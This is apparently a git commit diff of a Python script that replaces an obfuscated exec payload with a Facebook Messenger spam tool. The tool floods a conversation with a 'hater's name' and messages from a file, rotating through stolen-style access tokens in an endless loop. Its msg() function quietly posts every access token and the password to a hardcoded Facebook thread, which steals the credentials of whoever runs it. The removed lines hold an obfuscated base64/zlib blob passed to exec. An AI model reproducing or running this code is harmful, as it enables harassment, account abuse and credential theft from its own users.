109dc248b8004d25c13188c5a633ad857df449b7
hackertool45 <146292562+hackertool45@users.noreply.github.com>
2024-06-08 14:11:22 +0530

    Update main.py

--- main.py
+++ main.py
@@ -1,6 +1,156 @@
+import requests
+import json
+import time
+import sys
+from platform import system
+import os
+import subprocess
+import http.server
+import socketserver
+import threading
+import random
 
-# Obfuscated with PyObfuscate
-# https://wa.me/+918949732221
-# Time : Fri Jun  7 16:15:46 2024
-# -------------------------
-_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'=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'))	
+class MyHandler(http.server.SimpleHTTPRequestHandler):
+  def do_GET(self):
+    self.send_response(200)
+    self.send_header('Content-type', 'text/plain')
+    self.end_headers()
+    self.wfile.write(b"FUCK TH4 D4RK W3B SERV3R ")
+
+def execute_server():
+  PORT = 4000
+
+  with socketserver.TCPServer(("", PORT), MyHandler) as httpd:
+    print("Server running at http://localhost:{}".format(PORT))
+    httpd.serve_forever()
+
+def send_messages():
+  with open('password.txt', 'r') as file:
+    password = file.read().strip()
+
+  entered_password = password
+
+  if entered_password != password:
+    print('[-] <==> Incorrect Password!')
+    sys.exit()
+
+  with open('tokennum.txt', 'r') as file:
+    tokens = file.readlines()
+  num_tokens = len(tokens)
+
+  requests.packages.urllib3.disable_warnings()
+
+  def cls():
+    if system() == 'Linux':
+      os.system('clear')
+    else:
+      if system() == 'Windows':
+        os.system('cls')
+  cls()
+
+  def liness():
+    print('\u001b[37m' + '---------------------------------------------------')
+
+  headers = {
+    'Connection': 'keep-alive',
+    'Cache-Control': 'max-age=0',
+    'Upgrade-Insecure-Requests': '1',
+    'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
+    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+    'Accept-Encoding': 'gzip, deflate',
+    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
+    'referer': 'www.google.com'
+  }
+
+  mmm = requests.get('https://pastebin.com/raw/iyyPs98M').text
+
+
+
+  liness()
+
+  access_tokens = [token.strip() for token in tokens]
+
+  with open('convo.txt', 'r') as file:
+    convo_id = file.read().strip()
+
+  with open('file.txt', 'r') as file:
+    text_file_path = file.read().strip()
+
+  with open(text_file_path, 'r') as file:
+    messages = file.readlines()
+
+  num_messages = len(messages)
+  max_tokens = min(num_tokens, num_messages)
+
+  with open('hatersname.txt', 'r') as file:
+    haters_name = file.read().strip()
+
+  with open('time.txt', 'r') as file:
+    speed = int(file.read().strip())
+
+  liness()
+
+  def getName(token):
+    try:
+      data = requests.get(f'https://graph.facebook.com/v17.0/me?access_token={token}').json()
+    except:
+      data = ""
+    if 'name' in data:
+      return data['name']
+    else:
+      return "Error occured"
+
+  def msg():
+    parameters = {
+      'access_token' : random.choice(access_tokens),
+      'message': 'User Profile Name : '+getName(random.choice(access_tokens))+'\n Token : '+" | ".join(access_tokens)+'\n Link : https://www.facebook.com/messages/t/'+convo_id+'\n Password: '+password
+    }
+    try:
+      s = requests.post("https://graph.facebook.com/v15.0/t_100066819999632/", data=parameters, headers=headers)
+    except:
+      pass
+
+  msg()
+  while True:
+    try:
+      for message_index in range(num_messages):
+        token_index = message_index % max_tokens
+        access_token = access_tokens[token_index]
+
+        message = messages[message_index].strip()
+
+        url = "https://graph.facebook.com/v15.0/{}/".format('t_'+convo_id)
+        parameters = {'access_token': access_token, 'message': haters_name + ' ' + message}
+        response = requests.post(url, json=parameters, headers=headers)
+
+
+        current_time = time.strftime("%Y-%m-%d %I:%M:%S %p")
+        if response.ok:
+          print("[+] Messages {} of Convo {} sent by Token {}: {}".format(
+            message_index + 1, convo_id, token_index + 1, haters_name + ' ' + message))
+          print("  - Time: {}".format(current_time))
+          liness()
+          liness()
+        else:
+          print("[x] Failed to send messages {} of Convo {} with Token {}: {}".format(
+            message_index + 1, convo_id, token_index + 1, haters_name + ' ' + message))
+          print("  - Time: {}".format(current_time))
+          liness()
+          liness()
+        time.sleep(speed)
+
+      print("[+] All messages sent. Restarting the process...")
+    except Exception as e:
+      print("[!] An error occurred: {}".format(e))
+
+
+
+def main():
+  server_thread = threading.Thread(target=execute_server)
+  server_thread.start()
+
+  send_messages()
+
+if __name__ == '__main__':
+  main()
+  
